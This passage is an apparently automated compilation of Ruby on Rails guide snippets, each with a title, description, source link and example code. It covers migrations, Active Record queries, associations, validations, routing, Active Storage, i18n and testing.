directory using a namespaced Rake task (`blorgh:install:migrations`). This ensures the application's database schema includes tables required by the engine.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_30\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails blorgh:install:migrations\n```\n\n----------------------------------------\n\nTITLE: Enabling Strict Loading on a Record in Rails\nDESCRIPTION: Illustrates how to enable strict loading mode on an Active Record record using `strict_loading`.  This raises an `ActiveRecord::StrictLoadingViolationError` if any association is lazily loaded, helping to identify potential N+1 queries during development.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_157\n\nLANGUAGE: ruby\nCODE:\n```\nuser = User.strict_loading.first\nuser.address.city # raises an ActiveRecord::StrictLoadingViolationError\nuser.comments.to_a # raises an ActiveRecord::StrictLoadingViolationError\n```\n\n----------------------------------------\n\nTITLE: Customizing Allowed Tags/Attributes with sanitize Helper in Ruby\nDESCRIPTION: Demonstrates how to customize the `sanitize` helper by passing `:tags` and `:attributes` options. This allows only the specified HTML tags and attributes, overriding the defaults.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nsanitize @article.body, tags: %w(table tr td), attributes: %w(id class style)\n```\n\n----------------------------------------\n\nTITLE: Generating All Guides - Bash\nDESCRIPTION: Presents two shell commands for generating all Rails guides as HTML, facilitated by Rake and Bundler. Assumes dependencies are resolved via 'bundle install'. Output is a set of HTML files in the ./output directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake guides:generate\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake guides:generate:html\n```\n\n----------------------------------------\n\nTITLE: Updating Image Compression Options for Vips in Ruby on Rails\nDESCRIPTION: These code blocks demonstrate how to update image compression options for JPEG, PNG, WEBP, and GIF formats when switching from ImageMagick to Vips in Rails Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_25\n\nLANGUAGE: diff\nCODE:\n```\n- variant(strip: true, quality: 80, interlace: \"JPEG\", sampling_factor: \"4:2:0\", colorspace: \"sRGB\")\n+ variant(saver: { strip: true, quality: 80, interlace: true })\n```\n\nLANGUAGE: diff\nCODE:\n```\n- variant(strip: true, quality: 75)\n+ variant(saver: { strip: true, compression: 9 })\n```\n\nLANGUAGE: diff\nCODE:\n```\n- variant(strip: true, quality: 75, define: { webp: { lossless: false, alpha_quality: 85, thread_level: 1 } })\n+ variant(saver: { strip: true, quality: 75, lossless: false, alpha_q: 85, reduction_effort: 6, smart_subsample: true })\n```\n\nLANGUAGE: diff\nCODE:\n```\n- variant(layers: \"Optimize\")\n+ variant(saver: { optimize_gif_frames: true, optimize_gif_transparency: true })\n```\n\n----------------------------------------\n\nTITLE: Rails enum instance method\nDESCRIPTION: This shows how to use the automatically generated instance methods for an enum.  `order.shipped?` returns true if the order's status is `:shipped` and false otherwise.  `order.complete?` returns true if the order's status is `:complete` and false otherwise.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_178\n\nLANGUAGE: ruby\nCODE:\n```\norder = Order.shipped.first\norder.shipped?\norder.complete?\n```\n\n----------------------------------------\n\nTITLE: Creating Image Variants with Active Storage in Rails\nDESCRIPTION: Demonstrates how to create a variant of an image attachment with specific dimensions using the variant method. This example resizes the image to fit within 100x100 pixels while maintaining the original aspect ratio.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_56\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>\n```\n\n----------------------------------------\n\nTITLE: Setting Foreign Key Option in ActiveRecord Association\nDESCRIPTION: Demonstrates how to use the :foreign_key option to specify a custom foreign key name in a has_one association. This allows using a column other than the default naming convention for the foreign key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_109\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account, foreign_key: \"supp_id\"\nend\n```\n\n----------------------------------------\n\nTITLE: Removing All HTML Tags with strip_tags Helper in Ruby\nDESCRIPTION: Illustrates the `strip_tags` helper from Action View's SanitizeHelper. It removes all HTML tags, comments, and decodes HTML entities from a given string, returning plain text content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_tags(\"Strip <i>these</i> tags!\")\n# => Strip these tags!\n```\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_tags(\"<b>Bold</b> no more! <a href='more.html'>See more</a>\")\n# => Bold no more! See more\n```\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_links('<<a href=\"https://example.org\">malformed & link</a>')\n# => &lt;malformed &amp; link\n```\n\n----------------------------------------\n\nTITLE: Configuring Selenium with Firefox (Ruby)\nDESCRIPTION: This snippet shows how to configure the Selenium driver to use the Firefox browser in Rails system tests. It sets the `:using` option to `:firefox` within the `driven_by` method. Requires the selenium-webdriver gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\n  driven_by :selenium, using: :firefox\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Integration Test Skeleton - Bash\nDESCRIPTION: This bash command generates a skeleton file for integration tests in a Rails application.  The generator creates a Ruby file in the `test/integration` directory.  For example, `bin/rails generate integration_test user_flows` will create `test/integration/user_flows_test.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_54\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate integration_test user_flows\n      invoke  test_unit\n      create  test/integration/user_flows_test.rb\n```\n\n----------------------------------------\n\nTITLE: Displaying Individual Product in View (ERB)\nDESCRIPTION: This ERB snippet displays the name of a single product in the `show.html.erb` view, along with a link back to the products index page. It accesses the `@product` instance variable set in the controller.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_49\n\nLANGUAGE: erb\nCODE:\n```\n<h1><%= @product.name %></h1>\n\n<%= link_to \"Back\", products_path %>\n```\n\n----------------------------------------\n\nTITLE: Translate Helper Usage - ERB\nDESCRIPTION: This code demonstrates how to use the `translate` or `t` helper method in a Rails view to display translated text based on the current locale. It looks up the translation for the \"hello\" key in the locale files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_87\n\nLANGUAGE: erb\nCODE:\n```\n<h1><%= t \"hello\" %></h1>\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails Generators to Use a Custom Helper in Ruby\nDESCRIPTION: Shows how to modify `config/application.rb` to tell Rails to use the custom `my_helper` generator instead of the default `helper` generator. This is done by setting `g.helper :my_helper` within the `config.generators` block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.generators do |g|\n  g.helper :my_helper\nend\n```\n\n----------------------------------------\n\nTITLE: Limiting Generated Routes for Resources in Ruby on Rails\nDESCRIPTION: Demonstrates how to use the :only and :except options when defining resources to control which routes are generated. This helps optimize routing and reduce memory usage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: Ruby\nCODE:\n```\nmap.resources :photos, :only => [:index, :show]\nmap.resources :products, :except => :destroy\n```\n\n----------------------------------------\n\nTITLE: Select Box with Option Groups in ERB\nDESCRIPTION: This ERB code demonstrates how to group options within a select box using a Hash, where keys are the group labels and values are arrays of options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_37\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.select :city,\n      {\n        \"Europe\" => [ [\"Berlin\", \"BE\"], [\"Madrid\", \"MD\"] ],\n        \"North America\" => [ [\"Chicago\", \"CHI\"] ],\n      },\n      selected: \"CHI\" %>\n```\n\n----------------------------------------\n\nTITLE: Date calculations with beginning_of_month and end_of_month in Ruby\nDESCRIPTION: These methods return the dates for the beginning and end of the month. It demonstrates how to use `beginning_of_month` and `end_of_month` methods on a Date object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_144\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 9) # => Sun, 09 May 2010\nd.beginning_of_month     # => Sat, 01 May 2010\nd.end_of_month           # => Mon, 31 May 2010\n```\n\n----------------------------------------\n\nTITLE: Disabling Rails deep_munge Parameter Sanitization\nDESCRIPTION: Shows how to disable the deep_munge security feature in Rails, which protects against unexpected database queries. This should only be done if you understand the risks and have proper validation in place.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.perform_deep_munge = false\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for Polymorphic Association Manually\nDESCRIPTION: Shows how to manually create a database migration for a polymorphic association by defining separate columns for the foreign key (imageable_id) and type (imageable_type).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreatePictures < ActiveRecord::Migration[8.1]\n  def change\n    create_table :pictures do |t|\n      t.string  :name\n      t.bigint  :imageable_id\n      t.string  :imageable_type\n      t.timestamps\n    end\n\n    add_index :pictures, [:imageable_type, :imageable_id]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Checking for Errors on a Model in Rails\nDESCRIPTION: This snippet demonstrates how to check for errors on an ActiveRecord model instance after a validation has failed. It shows how to access the `errors` object and retrieve full error messages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_33\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product.errors\n=> #<ActiveModel::Errors [#<ActiveModel::Error attribute=name, type=blank, options={}>]>\n```\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product.errors.full_messages\n=> [\"Name can't be blank\"]\n```\n\n----------------------------------------\n\nTITLE: Generating Favicon Link Tag with favicon_link_tag Helper in Ruby\nDESCRIPTION: Demonstrates the `favicon_link_tag` helper from Action View's AssetTagHelper. It generates an HTML `<link>` tag for the favicon, typically sourcing it from the asset pipeline (`/assets/favicon.ico` by default).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nfavicon_link_tag\n# => <link href=\"/assets/favicon.ico\" rel=\"icon\" type=\"image/x-icon\" />\n```\n\n----------------------------------------\n\nTITLE: Declaring Delegated Type in Ruby on Rails\nDESCRIPTION: Defines a delegated_type in the Entry superclass to enable polymorphic relationships with Message and Comment models. This establishes the foundation for type delegation with specified parameters for the delegation field and dependent behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_86\n\nLANGUAGE: ruby\nCODE:\n```\nclass Entry < ApplicationRecord\n  delegated_type :entryable, types: %w[ Message Comment ], dependent: :destroy\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of find_by\nDESCRIPTION: This SQL query shows the equivalent SQL command for the `Customer.find_by(first_name: 'Lifo')` method in Rails. It selects all columns from the `customers` table where the `first_name` is 'Lifo' and limits the result to 1 record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_36\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.first_name = 'Lifo') LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Running EXPLAIN with Options (MySQL/MariaDB)\nDESCRIPTION: This snippet shows how to use the `:analyze` option with the `explain` command in Rails, specifically for MySQL and MariaDB. It aims to provide a deeper analysis of the query execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_217\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: 1).joins(:orders).explain(:analyze)\n```\n\n----------------------------------------\n\nTITLE: Defining a Singular Resource Route in Rails\nDESCRIPTION: This snippet demonstrates how to define a singular resource route using `resource` in Rails. It creates routes for a single resource, such as a geocoder, mapping to the `GeocodersController`. The `resolve` call is needed for record identification.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nresource :geocoder\nresolve(\"Geocoder\") { [:geocoder] }\n```\n\n----------------------------------------\n\nTITLE: Adding Gems to Gemfile\nDESCRIPTION: Demonstrates how to add gem entries to the generated application's `Gemfile` using the `gem` method.  Shows adding gems with no version specified, with a version, and with a comment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"bj\"\ngem \"nokogiri\"\n\ngem \"nokogiri\", \"~> 1.16.4\"\n\ngem \"nokogiri\", \"~> 1.16.4\", comment: \"Add the nokogiri gem for XML parsing\"\n```\n\n----------------------------------------\n\nTITLE: Defining an Unsubscribe Route in Rails\nDESCRIPTION: This code defines a route for handling unsubscribe requests. The `resource :unsubscribe` generates the necessary routes for a resource named `unsubscribe`, specifically including the `show` action for displaying the unsubscribe page. Only the `show` route is included.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_114\n\nLANGUAGE: ruby\nCODE:\n```\nresource :unsubscribe, only: [ :show ]\n```\n\n----------------------------------------\n\nTITLE: Creating and Saving ActiveRecord Objects in Ruby\nDESCRIPTION: This code shows different ways to create and save ActiveRecord objects, including using 'create', 'new', and block initialization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nbook = Book.create(title: \"The Lord of the Rings\", author: \"J.R.R. Tolkien\")\n\nbook = Book.new\nbook.title = \"The Hobbit\"\nbook.author = \"J.R.R. Tolkien\"\nbook.save\n\nbook = Book.new do |b|\n  b.title = \"Metaprogramming Ruby 2\"\n  b.author = \"Paolo Perrotta\"\nend\n\nbook.save\n```\n\n----------------------------------------\n\nTITLE: Including CSRF Meta Tags in Rails ERB Template\nDESCRIPTION: This ERB snippet shows how to include the necessary CSRF meta tags in a Rails application layout. The csrf_meta_tags helper method generates meta tags containing the CSRF token that JavaScript frameworks need for non-GET requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_16\n\nLANGUAGE: erb\nCODE:\n```\n<head>\n  <%= csrf_meta_tags %>\n</head>\n```\n\n----------------------------------------\n\nTITLE: Creating Binary Data Storage with Bytea in Rails\nDESCRIPTION: Demonstrates how to create and use binary data storage using PostgreSQL's bytea type in a Rails model. Shows migration setup and basic usage for storing binary data like PDF files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20140207133952_create_documents.rb\ncreate_table :documents do |t|\n  t.binary \"payload\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/document.rb\nclass Document < ApplicationRecord\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Usage\ndata = File.read(Rails.root + \"tmp/output.pdf\")\nDocument.create payload: data\n```\n\n----------------------------------------\n\nTITLE: Registering a before_validation callback with a block in Rails\nDESCRIPTION: This code snippet demonstrates registering a `before_validation` callback using a block. The block assigns the `email` value to the `username` if `username` is blank.  It also validates the presence of `username` and `email`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :username, :email, presence: true\n\n  before_validation do\n    self.username = email if username.blank?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Validators in Ruby on Rails\nDESCRIPTION: Demonstrates how to create custom validators by inheriting from ActiveModel::Validator or ActiveModel::EachValidator. Examples show a custom validator for names starting with 'X' and an email validator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyValidator < ActiveModel::Validator\n  def validate(record)\n    unless record.name.start_with? \"X\"\n      record.errors.add :name, \"Provide a name starting with X, please!\"\n    end\n  end\nend\n\nclass Person < ApplicationRecord\n  validates_with MyValidator\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass EmailValidator < ActiveModel::EachValidator\n  def validate_each(record, attribute, value)\n    unless URI::MailTo::EMAIL_REGEXP.match?(value)\n      record.errors.add attribute, (options[:message] || \"is not an email\")\n    end\n  end\nend\n\nclass Person < ApplicationRecord\n  validates :email, presence: true, email: true\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Locale Switching in ApplicationController\nDESCRIPTION: Implementation of a locale switching mechanism using an around_action callback in ApplicationController. This sets the locale based on URL parameters or falls back to the default locale.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/application_controller.rb\nclass ApplicationController < ActionController::Base\n  around_action :switch_locale\n\n  def switch_locale(&action)\n    locale = params[:locale] || I18n.default_locale\n    I18n.with_locale(locale, &action)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Mounting Action Cable within a Rails Application\nDESCRIPTION: This snippet shows how to mount Action Cable within a Rails application. The `mount_path` option in `config.action_cable` specifies the URL path where Action Cable will listen for WebSocket requests. This is typically configured in `config/application.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nclass Application < Rails::Application\n  config.action_cable.mount_path = \"/websocket\"\nend\n```\n\n----------------------------------------\n\nTITLE: Listing Validators in Ruby on Rails\nDESCRIPTION: Shows how to list all validators for a model or for a specific attribute using the validators and validators_on methods. The example demonstrates listing validators for a Person model with custom and built-in validators.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true, on: :create\n  validates :email, format: URI::MailTo::EMAIL_REGEXP\n  validates_with MyOtherValidator, strict: true\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> Person.validators\n#=> [#<ActiveRecord::Validations::PresenceValidator:0x10b2f2158\n      @attributes=[:name], @options={:on=>:create}>,\n     #<MyOtherValidatorValidator:0x10b2f17d0\n      @attributes=[:name], @options={:strict=>true}>,\n     #<ActiveModel::Validations::FormatValidator:0x10b2f0f10\n      @attributes=[:email],\n      @options={:with=>URI::MailTo::EMAIL_REGEXP}>]\n     #<MyOtherValidator:0x10b2f0948 @options={:strict=>true}>]\n\nirb> Person.validators_on(:name)\n#=> [#<ActiveModel::Validations::PresenceValidator:0x10b2f2158\n      @attributes=[:name], @options={on: :create}>]\n```\n\n----------------------------------------\n\nTITLE: Setting Up Active Storage Mirror Services with Multiple S3 Backends (YAML)\nDESCRIPTION: Demonstrates how to define mirror services in Active Storage's YAML config to replicate uploads and deletes across multiple Amazon S3 services. This includes setting up primary and mirror S3 service endpoints with credentials referencing Rails secrets, and configuring a mirror service that specifies which services to mirror. Region, bucket settings, and use of environment suffixes are handled. Mirroring is not atomic, so additional integrity checks may be necessary.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n# Use bin/rails credentials:edit to set the AWS secrets (as aws:access_key_id|secret_access_key)\ns3_west_coast:\n  service: S3\n  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>\n  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>\n  region: \"\" # e.g. 'us-west-1'\n  bucket: your_own_bucket-<%= Rails.env %>\n\ns3_east_coast:\n  service: S3\n  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>\n  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>\n  region: \"\" # e.g. 'us-east-1'\n  bucket: your_own_bucket-<%= Rails.env %>\n\nproduction:\n  service: Mirror\n  primary: s3_east_coast\n  mirrors:\n    - s3_west_coast\n```\n\n----------------------------------------\n\nTITLE: Creating Comment Form Partial (HTML+ERB)\nDESCRIPTION: Defines the content for the comment form partial (`app/views/blorgh/comments/_form.html.erb`). It uses `form_with` to build a form associated with a new comment object (`@article.comments.build`), targeting the nested comments route for the specific article.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_21\n\nLANGUAGE: html+erb\nCODE:\n```\n<h3>New comment</h3>\n<%= form_with model: [@article, @article.comments.build] do |form| %>\n  <p>\n    <%= form.label :text %><br>\n    <%= form.textarea :text %>\n  </p>\n  <%= form.submit %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Reloading Association Cache in Rails\nDESCRIPTION: Shows how to reload the association cache when data might have been changed by another part of the application. This pattern ensures fresh data is fetched from the database when needed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_92\n\nLANGUAGE: ruby\nCODE:\n```\n# retrieves books from the database\nauthor.books.load\n\n# uses the cached copy of books\nauthor.books.size\n\n# discards the cached copy of books and goes back to the database\nauthor.books.reload.empty?\n```\n\n----------------------------------------\n\nTITLE: Rendering Inventory Partial (ERB)\nDESCRIPTION: This code snippet renders the `_inventory.html.erb` partial within the `products/show.html.erb` view, passing the `@product` variable to the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_105\n\nLANGUAGE: erb\nCODE:\n```\n<%= render \"inventory\", product: @product %>\n```\n\n----------------------------------------\n\nTITLE: Using each_with_object Method in Ruby on Rails\nDESCRIPTION: Demonstrates the use of the each_with_object method, which provides an alternative to inject. It iterates over a collection, passing the current element and an accumulator object into the block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: Ruby\nCODE:\n```\n%w(foo bar).each_with_object({}) { |str, hsh| hsh[str] = str.upcase } # => {'foo' => 'FOO', 'bar' => 'BAR'}\n```\n\n----------------------------------------\n\nTITLE: Storing Translations in Ruby Hash Format\nDESCRIPTION: Example of how to store translations in a Ruby Hash format, where the top level key is the locale (pt), with nested namespace keys (foo) and translation keys (bar).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  pt: {\n    foo: {\n      bar: \"baz\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using limit with has_and_belongs_to_many Association in ActiveRecord\nDESCRIPTION: Demonstrates how to use the limit option with a has_and_belongs_to_many association to restrict the number of objects fetched. This example also shows combining multiple options (order and limit).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_126\n\nLANGUAGE: ruby\nCODE:\n```\nclass Parts < ApplicationRecord\n  has_and_belongs_to_many :assemblies,\n    -> { order(\"created_at DESC\").limit(50) }\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Database Role Configuration in Ruby\nDESCRIPTION: Configuration for custom database role names in application config.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.writing_role = :default\nconfig.active_record.reading_role = :readonly\n```\n\n----------------------------------------\n\nTITLE: Fetching Products in Controller (Ruby)\nDESCRIPTION: This code snippet demonstrates fetching all products from the database within the `index` action of the `ProductsController`. It assigns the result to an instance variable `@products`, which is then accessible in the view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n    @products = Product.all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of finding multiple records with composite primary key\nDESCRIPTION: This snippet shows the SQL query generated when fetching multiple records using composite primary keys with the `find` method. It uses `OR` to combine the conditions for each composite key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE (store_id = 1 AND sku = 'ABC98765' OR store_id = 7 AND sku = 'ZZZ11111')\n```\n\n----------------------------------------\n\nTITLE: Controlling When Custom Validations Run in Rails\nDESCRIPTION: This snippet shows how to control when custom validations run by providing the :on option to the validate method. This allows specifying whether the validation should run on :create or :update operations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\nclass Invoice < ApplicationRecord\n  validate :active_customer, on: :create\n\n  def active_customer\n    errors.add(:customer_id, \"is not active\") unless customer.active?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using select with has_many Association in ActiveRecord\nDESCRIPTION: Shows how to use the select option with a has_many association to retrieve only specific columns (id and title) from the associated objects, optimizing database queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_123\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, -> { select(:id, :title) } # Only select id and title columns\nend\n\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n```\n\n----------------------------------------\n\nTITLE: Eagerly Requiring Helpers Using Globbing\nDESCRIPTION: This code demonstrates how to eagerly require all helper files in a directory using globbing.  This makes the helpers implicitly accessible in all test files, but it can increase boot-up time.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\n# test/test_helper.rb\nDir[Rails.root.join(\"test\", \"test_helpers\", \"**\", \"*.rb\")].each { |file| require file }\n```\n\n----------------------------------------\n\nTITLE: Render Action Example (Rails/Ruby)\nDESCRIPTION: This example demonstrates rendering the `index` action from within the `show` action when a book is not found. It highlights the potential issue of missing instance variables in the rendered view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\ndef index\n  @books = Book.all\nend\n\ndef show\n  @book = Book.find_by(id: params[:id])\n  if @book.nil?\n    render action: \"index\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Resetting Association Cache via reset_association - Ruby\nDESCRIPTION: Unloads the cached associated object so that the next access queries the database again. Used to invalidate the association cache for @book's author. Does not return a value; affects subsequent associations lookups.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n@book.reset_author\n```\n\n----------------------------------------\n\nTITLE: Running Component-Specific Tests in Bash (Action Mailer)\nDESCRIPTION: This command changes the current directory to a specific Rails component (Action Mailer in this example) and runs its dedicated test suite using the `bin/test` executable. This is faster than running the full Rails test suite.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\n$ cd actionmailer\n$ bin/test\n```\n\n----------------------------------------\n\nTITLE: Granular Database Connection Switching for Role and Shard\nDESCRIPTION: Example of switching database connections for a specific role and shard combination, showing how to read from a specific shard's replica database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nAnimalsRecord.connected_to(role: :reading, shard: :shard_one) do\n  # Will read from shard_one_replica. If no connection exists for shard_one_replica,\n  # a ConnectionNotEstablished error will be raised.\n  Dog.first\n\n  # Will read from primary writer.\n  Person.first\nend\n```\n\n----------------------------------------\n\nTITLE: Disabling Metadata Table in PostgreSQL (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to disable the metadata table in a PostgreSQL database configuration for a Rails application. Setting `use_metadata_table` to `false` prevents Rails from storing environment and schema information in the `ar_internal_metadata` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_96\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: postgresql\n  use_metadata_table: false\n```\n\n----------------------------------------\n\nTITLE: Matching Multiple HTTP Verbs (Ruby)\nDESCRIPTION: Matches both GET and POST requests to the `show` action of the `PhotosController` using the `match` method and the `:via` option. This allows a single action to handle different types of requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nmatch \"photos\", to: \"photos#show\", via: [:get, :post]\n```\n\n----------------------------------------\n\nTITLE: Initializing Active Record Encryption Keys\nDESCRIPTION: Command to generate random encryption keys for Active Record Encryption including primary key, deterministic key, and key derivation salt.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:encryption:init\nAdd this entry to the credentials of the target environment:\n\nactive_record_encryption:\n  primary_key: EGY8WhulUOXixybod7ZWwMIL68R9o5kC\n  deterministic_key: aPA5XyALhf75NNnMzaspW7akTfZp0lPY\n  key_derivation_salt: xEY0dt6TZcAMg52K7O84wYzkjvbA62Hz\n```\n\n----------------------------------------\n\nTITLE: AND Condition in Rails\nDESCRIPTION: Shows how to chain `where` 